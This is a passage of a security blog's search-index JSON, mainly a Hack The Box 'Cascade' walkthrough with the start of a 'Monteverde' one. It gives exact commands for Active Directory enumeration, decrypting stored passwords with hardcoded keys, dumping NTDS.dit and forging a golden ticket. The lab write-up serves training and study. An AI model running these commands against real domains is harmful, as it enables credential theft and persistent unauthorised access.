Thrift XML-RPC JSON-RPC Java RMI (Remote Method Invocation) RPC vs. REST RPC: Function-centric: Focuses on actions and procedures Typically uses POST method for all operations Often uses a single endpoint Can be more efficient for complex operations REST: Resource-centric: Focuses on data entities Uses different HTTP methods (GET, POST, PUT, DELETE) Uses multiple endpoints based on resources Generally simpler and more widely used for web APIs Further Reading Microsoft RPC Documentation gRPC Documentation OWASP Web Service Security Cheat Sheet ", 
        "url": "http:\/\/localhost:1313\/cheatsheets\/rpc-cheatsheet\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/cascade-box\/": {
        "title": "Cascade HTB Walkthrough",
        "tags": ["Box","HTB","Active Directory","Windows","LDAP","RPC","SQL","CSharp",],
        "content": "Cascade Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Cascade How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Cascade/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 17:50:51 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 17:50 BST Nmap scan report for 10.129.136.213 Host is up (0.040s latency). Not shown: 986 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49165/tcp open unknown Initial thoughts: DNS, Kerberos, SMB \u0026amp; LDAP all great for enumerating. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46.02-HTB/BlogEntriesMade/Cascade/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh took 10s 🕙 17:51:04 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 17:51 BST Nmap scan report for 10.129.136.213 Host is up (0.039s latency). Not shown: 65520 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-14 16:55:35Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 2008|7|Phone|Vista|8.1 (89%) OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows 8.1 Update 1 (89%), Microsoft Windows Phone 7.5 or 8.0 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%), Microsoft Windows Vista SP2 (89%), Microsoft Windows Embedded Standard 7 (88%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (88%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | smb2-time: | date: 2024-10-14T16:56:32 |_ start_date: 2024-10-14T16:47:45 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 324.37 seconds Findings: DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note, just standard DNS entries. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc casc-dc1.cascade.local ~/Wordlists/statistically-likely-usernames/jsmith.txt I get no hits. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Neither work. RPC 111: As RPC is running on the host we can attempt to enumerate using it.\n49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC Connecting to RPC using a null session with rpcclient:\nrpcclient -U \u0026quot;%\u0026quot; $box Awesome we can get a null session. +Note+: I actually wrote a cheat-sheet blog off of the back of this enumeration which goes into a deep dive regarding RPC:\nhttps://bloodstiller.com/cheatsheets/rpc-cheatsheet/ Enumerating users with rpcclient: Enumerating users:\nenumdomusers There are some interesting things straight away here. The CascGuest \u0026amp; BackupSvc accounts. It looks like they have replaced their standard Guest account with CascGuest I attempt to connect as CascGuest using netexec:\nIt fails. I attempt to add myself as a user to the domain but am denied:\ncreatedomuser bloodstiller Now that we have the user \u0026amp; group RIDs we can enumerate further.\nDiscovering User Login Scripts with rpcclient: Using rpcclient we can enumerate specific by passing their RID to the command queryuser\nqueryuser 0x453 Steve Smith has the MapAuditDrive.vbs:\nMultiple Users have the MapDataDrive.vbs logon script:\nJames Wakefield Stephanie Hickson John Goodhand Edward Crowe David Burman Joseph Allen Ian Croft Enumerating Groups with rpcclient: Enumerating groups with rpcclient:\nenumdomgroups I enumerate all of these groups however there is no additional information in their description fields:\nquerygroup RID I enumerate builtin groups too however it says they do not exist when trying to delve further:\nenumalsgroups builtin I do the same again with the domain groups but have the same issue:\nenumalsgroups domain Why so many different rpcclient group enumeration commands? Just in-case you are wondering, why has he listed all of these different ways to list groups \u0026amp; gotten different results each time? enumdomgroups: Lists domain-wide groups that are used across the Active Directory domain. enumalsgroups domain: Lists local alias groups that are specific to the domain controller or server itself. Enumerating the password policy with rpcclient: I get the domains password policy: getdompwinfo But what does this mean? Understanding password_properties: password_properties is a bitmask, where different bits control specific password policies.\nHere are the common flags and what each bit represents:\nHex Value: 0x00000001\nFlag: DOMAIN_PASSWORD_COMPLEX\nMeaning: Enforces password complexity (requires uppercase, lowercase, digits, symbols)\nHex Value: 0x00000002\nFlag: DOMAIN_PASSWORD_NO_ANON_CHANGE\nMeaning: Prevents anonymous users from changing passwords\nHex Value: 0x00000004\nFlag: DOMAIN_PASSWORD_NO_CLEAR_CHANGE\nMeaning: Prevents passwords from being sent in cleartext\nHex Value: 0x00000008\nFlag: DOMAIN_LOCKOUT_ADMINS\nMeaning: Locks out administrators as well when lockout occurs\nHex Value: 0x00000010\nFlag: DOMAIN_PASSWORD_STORE_CLEARTEXT\nMeaning: Allows storing passwords using reversible encryption (cleartext)\nHex Value: 0x00000020\nFlag: DOMAIN_REFUSE_PASSWORD_CHANGE\nMeaning: Prevents users from changing their password\nHex Value: 0x00000000\nMeaning: Means that none of these password restrictions are enabled.\nIn this case, no complexity rules, no restrictions on anonymous password changes, and no other special password policies are applied.\nLDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker python3 ldapchecker.py $box It turns out the anonymous bind is enabled however we can still get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.12.6 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:05:48 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.136.213 with SSL... Failed to connect with SSL. Retrying without SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=cascade,DC=local CN=Configuration,DC=cascade,DC=local CN=Schema,CN=Configuration,DC=cascade,DC=local DC=DomainDnsZones,DC=cascade,DC=local DC=ForestDnsZones,DC=cascade,DC=local We have the domain functionaility level:\ndomainFunctionality: 4 forestFunctionality: 4 domainControllerFunctionality: 4 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 4 which means that this server has to be running Windows Server 2008 R2 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nserverName: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. LDAP User \u0026amp; Group Enumeration Using Anonymous Bind: As anonymous bind is enabled we can enumerate all the users on the domain also:\nldapsearch -H ldap://casc-dc1.$domain:389 -x -b \u0026quot;DC=cascade,DC=local\u0026quot; -s sub \u0026quot;(\u0026amp;(objectclass=user))\u0026quot; | grep sAMAccountName: | cut -f2 -d\u0026quot; \u0026quot; \u0026gt;\u0026gt; ldapUsers.txt My first command just extacted SAM names, which we already have from RPC, so lets extract all the users information:\nldapsearch -H ldap://casc-dc1.$domain:389 -x -b \u0026quot;DC=cascade,DC=local\u0026quot; -s sub \u0026quot;(\u0026amp;(objectclass=user))\u0026quot; \u0026gt;\u0026gt; ldapUsersAll.txt As anonymous bind is enabled we can enumerate all the groups on the domain also: ldapsearch -H ldap://casc-dc1.$domain:389 -x -b \u0026quot;DC=cascade,DC=local\u0026quot; -s sub \u0026quot;(\u0026amp;(objectclass=Group))\u0026quot; | grep sAMAccountName: | cut -f2 -d\u0026quot; \u0026quot; \u0026gt;\u0026gt; ldapGroups.txt 2. Foothold: Finding a password in the cascadeLegacyPwd field: Looking through the extracted user data from ldap I see there is a field called cascadeLegacyPwd in the users r.thompson\u0026rsquo;s entry.\nI test the password with netexec but it doesn\u0026rsquo;t work:\nnetexec smb $box -u $user -p $pass --shares +It dawns on me, it\u0026rsquo;s base64 encoded!!!+\nI decode the password: echo $pass | base64 -d +Note+: Ironically it would have been a better password in it\u0026rsquo;s bas64 encoded form as it has: Uppercase Lowercase Numbers Symbols Is longer. Enumerating the domain as r.thompson: I check ryan\u0026rsquo;s creds with netexec and get access: netexec smb $box -u $user -p $pass --shares Pillaging the IT SMB Share: I connect using smbclient:\nsmbclient -U $domain\\\\$user \\\\\\\\$box\\\\Data I find shares and see if I can access them all however I am only able to access the IT share currently:\nI find a file called Meeting_Notes_June_2018.html in the Email Archives directory I download it:\nget Meeting_Notes_June_2018.html I find a file called ArkAdRecycleBin.log in the Logs\\Ark AD Recycle Bin\\ folder:\nget ArkAdRecycleBin.log I find a file called dcdiag.log in the Logs\\DCs\\ folder:\nget dcdiag.log I find a file called VNC Install.reg *in the* \\IT\\Temp\\s.smith\\ folder:\nget \u0026quot;VNC Install.reg\u0026quot; Pillaging the NETLOGON share: I access the NETLOGON share: smbclient -U $domain\\\\$user \\\\\\\\$box\\\\NETLOGON I find two scripts: MapAuditDrive.vbs \u0026amp; MapDataDrive.vbs I download them both: - Finding that there is a TempAdmin account with the same password as normal admin: In the Meeting_Notes_June_2018.html file it says there is a TempAdmin account that should have the same password as the normal Admin\nHowever looking at ArkAdRecycleBin.log it looks like this account has already been deleted:\nWe will file this away incase it is useful later. Finding a TightVNC password in VNC Install.reg Looking at the VNC Install.reg file I can see it\u0026rsquo;s the registyr entry for a TightVNC install:\nThere is a hard-coded hex password in the file:\nSome quick DuckDuckGoing (doesn\u0026rsquo;t sound as cool as \u0026ldquo;Googling\u0026rdquo;) \u0026amp; I find a decryption method:\nAccording to this entry VNC uses a hard-coded DES key to store credentials. And the same key is used across multiple different products. I use the command at the bottom of the page \u0026amp; get the clear-text password:\necho -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv I test if it\u0026rsquo;s s.smiths \u0026amp; it is:\nnetexec smb $box -u $user -p $pass Running a bloodhound collection: It\u0026rsquo;s about time we ran a bloodhound collection after grabbing all the low-hanging fruit: python3 bloodhound.py -dc casc-dc1.$domain -c All -u $user -p $pass -d $domain -ns $box Enumerating as s.smith: Looking at the bloodhound data we can see that s.smith is part of numerous groups:\nWe can see he is part of the \u0026ldquo;Remote Management Users\u0026rdquo; so we should be able to get access to the machine now. I access the host via evil-winrm:\nevil-winrm -i $box -u $user -p $pass Get our user flag:\nEnumerating \u0026amp; pillaging the audit$ share: We can see that they also have access to the audit$ share:\nI connect using smbclient:\nsmbclient -U $domain\\\\$user \\\\\\\\$box\\\\Audit$ There are alot of interesting things here. To make life easier I create a .tar file of all the files:\ntar c all.tar +Note+: This will make a .tar of all the files excluding directories and download it automatically. I download the remaining files in the directories:\nx86\\SQLite.Interop.dll x64\\SQLite.Interop.dll DB\\Audit.db 3. Privilege Escalation: Examining DB\\Audit.db: I open DB\\Audit.db in sqlitebrowser:\nThe ldap table appears to have the credentials for the ArkSvc service. I try \u0026amp; base64 decode it however it appears to be a malformed string: It could be encrypted and we don\u0026rsquo;t have the encryption key. The rest of the tables related to deleted accounts:\nLooking at RunAudit.bat we can see it is just used to run CascAudit.exe \u0026amp; pass the Audit.db to it:\nI want to decompile the .exe and dll so will fire up my command windows vm:\nIf you\u0026rsquo;re unfamiliar with the command project, it\u0026rsquo;s great: https://github.com/mandiant/commando-vm It\u0026rsquo;s an offensive VM with loads of great tools. Finding a hardcoded decryption key in the CascAudit.exe binary using DNSpy: Opening the CascAudit.exe in DNSpy I immediately find a hard-coded decryption key win the MainModule. Let\u0026rsquo;s break this code down: Below is the code that we are most interested in. Lets break it down. { using (SQLiteConnection sQLiteConnection = new SQLiteConnection(\u0026#34;Data Source=\u0026#34; + MyProject.Application.CommandLineArgs[0] + \u0026#34;;Version=3;\u0026#34;)) { string text = string.Empty; string password = string.Empty; string text2 = string.Empty; try { sQLiteConnection.Open(); using (SQLiteCommand sQLiteCommand = new SQLiteCommand(\u0026#34;SELECT * FROM LDAP\u0026#34;, sQLiteConnection)) { using (SQLiteDataReader sQLiteDataReader = sQLiteCommand.ExecuteReader()) { sQLiteDataReader.Read(); text = Conversions.ToString(sQLiteDataReader[\u0026#34;Uname\u0026#34;]); text2 = Conversions.ToString(sQLiteDataReader[\u0026#34;Domain\u0026#34;]); string encryptedString = Conversions.ToString(sQLiteDataReader[\u0026#34;Pwd\u0026#34;]); try { password = Crypto.DecryptString(encryptedString, \u0026#34;c4scadek3y654321\u0026#34;); } catch (Exception ex2) { Console.WriteLine(\u0026#34;Error decrypting password: \u0026#34; + ex2.Message); return; } } } sQLiteConnection.Close(); } Database Connection and Initialization using (SQLiteConnection sQLiteConnection = new SQLiteConnection(\u0026#34;Data Source=\u0026#34; [PlusSymbol] MyProject.Application.CommandLineArgs[0] [PlusSymbol] \u0026#34;;Version=3;\u0026#34;)) Creates a new SQLite connection using the database file path from the first command-line argument. string text = string.Empty; string password = string.Empty; string text2 = string.Empty; Initializes empty strings to store the username (text), password, and domain (text2). sQLiteConnection.Open(); Opens the SQLite database connection. Querying the Database\nusing (SQLiteCommand sQLiteCommand = new SQLiteCommand(\u0026quot;SELECT * FROM LDAP\u0026quot;, sQLiteConnection)) Creates an SQL command to select all data from the LDAP table. using (SQLiteDataReader sQLiteDataReader = sQLiteCommand.ExecuteReader()) Executes the SQL command and creates a reader for the results. sQLiteDataReader.Read(); Reads the first row of the query results. Retrieving LDAP Credentials:\ntext = Conversions.ToString(sQLiteDataReader[\u0026quot;Uname\u0026quot;]); text2 = Conversions.ToString(sQLiteDataReader[\u0026quot;Domain\u0026quot;]); string encryptedString = Conversions.ToString(sQLiteDataReader[\u0026quot;Pwd\u0026quot;]); Retrieves the username, domain, and encrypted password from the query results. Stores these values in the respective variables. Password Decryption:\npassword = Crypto.DecryptString(encryptedString, \u0026quot;c4scadek3y654321\u0026quot;); Attempts to decrypt the password using a custom Crypto.DecryptString method. This is actually calling the CascCrypto.dll that was also available in the audit share. +Security Note+: The decryption key \u0026quot;c4scadek3y654321\u0026quot; is hardcoded, which is a significant security risk, as anyone who decompiles the binary can find this key. Cleanup:\nsQLiteConnection.Close(); Closes the SQLite database connection. So what does it do?\nThis code retrieves LDAP credentials from an SQLite database and decrypts the password. Remember we found Audit.db earlier which is an SQLite db which had an entry for the ArkSvc account\u0026gt; Extracting the ArkSvc password from CascAudit.exe: +Requirements+: For this to work, we will need the Audit.db \u0026amp; CascCrypto.dll, the .dll has to be in the same folder as the .exe\nSet a breakpoint in DNSpy.\nSelect the line with the encryption key \u0026amp; right-click \u0026amp; select \u0026ldquo;Add Breakpoint\u0026rdquo; Click \u0026ldquo;Start\u0026rdquo;:\nFrom the \u0026ldquo;Arguments\u0026rdquo; section ensure you select the location of the Audit.db\nClick \u0026ldquo;OK\u0026rdquo; +Note+: If you remember in RunAudit.Bat we can see that the argument the .exe takes is the location of the .db The debugger will break on the line we selected, however to get the result we need to step over it:\nOnce we have stepped over the clear text password will be visible:\n+Note+: It has trailing \\0\\0\\0, these can be deleted. I verify the credentials work using netexec:\n5. Ownership: Enumerating as arksvc: Checking bloodhound I can see that arksvc has access to the AD Recyle Bin:\nIf you remember we saw that temp-admin was in the recycle bin when we were looking at the recovered Audit.db file: After some quick searching I find this article which details how to recover deleted objects in the AD Recycle Bin. It says:\nBy default, if an object has been deleted, it can be recovered within a 180 days interval. This value is specified in the msDS-DeletedObjectLifetime attribute\nFinding the Administrator Password in the cascadeLegacyPwd field of a deleted object: I list the objects in the recycling bin:\nGet-ADObject -filter ‘isdeleted -eq $true -and name -ne “Deleted Objects”‘ -includeDeletedObjects -property * I immediately find the deleted temp-admin account:\nLooking at the entry we can see that is has the same cascadeLegacyPwd field that we found before that contained a base64 encoded password\nIf you remember when we looked at Meeting_Notes_June_2018.html it said that the temp-admin and normal admin have the same password: I decode the password:\nBoom we have root:\nLets get our root flag:\n4. Persistence: Dumping NTDS.dit: Lets dump the NTDS.dit database using netexec: netexec smb $box -u $user -p $pass -M ntdsutil Creating a Golden Ticket: Using impacket-lookupsid to extract the domain SID:\nimpacket-lookupsid $domain/administrator@$box -domain-sids I use impacket-ticketer to create the ticket:\nIt kicks out a bunch of errors but creates the administrator.ccache I sync my clock with the target:\nsudo ntpdate -s casc-dc1.$domain I load the ticket into the KRB5CCNAME Variable:\nexport KRB5CCNAME=./administrator.ccache I connect using impacket-psexec:\nimpacket-psexec casc-dc1.$domain -k Lessons Learned: What did I learn? I actually had a lot fun using RPC to enumerate, purely as a test, to see how much I could get from the box before I had to switch to other means. It was fun. It was also nice to have a box where the approach wasn\u0026rsquo;t web based or something in an open share etc, it was fun to use LDAP (which I enjoy) extensively. I never knew about recovering items from the AD Recycling Bin. I learned more about C# decompiling etc, however I am going to do more work on this so I have a better understanding. This is one of my weaker points. What silly mistakes did I make? Oh, one day I couldn\u0026rsquo;t sleep so woke up at 4:30am and wondered why it wouldn\u0026rsquo;t connect for ages until I realized I hadn\u0026rsquo;t updated /etc/hosts that was fun. Again, I spent alot of time on the C# decompiling etc as it\u0026rsquo;s one of my weaker areas. Oh not realizing the first found password was base64 encoded for a few mins was fun…. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/cascade-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cheatsheet\/": {
        "title": "CheatSheet",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cheatsheet\/"
    },
    
    "http:\/\/localhost:1313\/tags\/csharp\/": {
        "title": "CSharp",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/csharp\/"
    },
    
    "http:\/\/localhost:1313\/tags\/sql\/": {
        "title": "SQL",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/sql\/"
    },
    
    "http:\/\/localhost:1313\/tags\/azure\/": {
        "title": "Azure",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/azure\/"
    },
    
    "http:\/\/localhost:1313\/tags\/azure-ad-connect\/": {
        "title": "Azure AD Connect",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/azure-ad-connect\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/monteverde-box\/": {
        "title": "Monteverde HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Windows","LDAP","Active Directory","Azure AD Connect","Azure","SQL","MSSQL","Download Cradle",],
        "content": "Monteverde Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Monteverde How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $pass = Passwords I have access to. Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Monteverde_Unfinished/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:24:32 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 11:24 BST Nmap scan report for 10.129.228.111 Host is up (0.040s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds Initial thoughts: DNS, Kerberos, LDAP \u0026amp; SMB give us great starting points for enumeration. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46.02-HTB/BlogEntriesMade/Monteverde_Unfinished/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh took 12s 🕙 11:24:49 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 11:25 BST Nmap scan report for 10.129.228.111 Host is up (0.071s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-13 10:28:37Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49676/tcp open msrpc Microsoft Windows RPC 49696/tcp open msrpc Microsoft Windows RPC 49796/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (88%) Aggressive OS guesses: Microsoft Windows Server 2019 (88%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-10-13T10:29:42 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 304.90 seconds Findings: SMB Signing is enabled so no relay attacks. We seem to be dealing with server 2019. LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker python3 ldapchecker.py $box It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.12.6 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:25:54 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.228.111 with SSL... Failed to connect with SSL. Retrying without SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=MEGABANK,DC=LOCAL CN=Configuration,DC=MEGABANK,DC=LOCAL CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=MEGABANK,DC=LOCAL ldapServiceName: MEGABANK.LOCAL:monteverde$@MEGABANK.LOCAL The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would 